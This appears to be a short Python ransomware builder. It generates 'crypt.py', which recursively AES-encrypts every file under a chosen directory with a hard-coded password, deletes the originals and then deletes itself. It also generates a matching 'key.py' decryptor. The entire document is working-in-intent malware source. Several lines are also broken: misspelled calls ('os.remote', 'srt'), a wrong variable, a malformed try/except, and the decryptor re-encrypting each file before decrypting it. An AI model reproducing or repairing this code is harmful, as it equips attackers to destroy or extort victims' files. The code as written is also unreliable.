direct = input("Write the home directory: ")
password = input("Set the password: ")
print("-------------------------------------------------------")
with open("crypt.py", "w") as crypt:
    crypt.write('''
import os, sys
def crypt(file):
    import pyAesCrypt
    print("-------------------------------------------------------")
    password = "'''+str(password)+'''"
    bufferSize = 512*1024
    pyAesCrypt.encryptFile(str(file), str(file)+".crp", password, bufferSize)
    print("[crypted] '"+str(file)+".crp'")
    os.remote(file)
def walk(dir):
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        if os.path.isfile(path): crypt(path)
        else:
            walk(path)
walk("'''+str(direct)+'''")
print("-------------------------------------------------------")
os.remove(str(sys.argv[0]))
''')
    print("[+] File 'crypt.py' successfully saved!")

with open("key.py", "w") as key:
    key.write('''
import os, sys
def decrypt(file):
    import pyAesCrypt
    print("-------------------------------------------------------")
    password = "'''+str(password)+'''"
    bufferSize = 512*1024
    pyAesCrypt.encryptFile(str(file), str(file)+".crp", password, bufferSize)
    pyAesCrypt.decryptFile(srt(file), str(os.path.splitext(file)[0]), password, bufferSize)
    print("[decrypt] '"+str(os.path.splitext(file)[0])+"'")
    os.remove(file)
def walk(dir):
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        if os.path.isfile(path):
            try: decrypt(file)
        except: pass
walk("'''+str(direct)+'''")
print("-------------------------------------------------------")
''')
    print("[+] File key.py successfully saved!" )
print("-------------------------------------------------------")
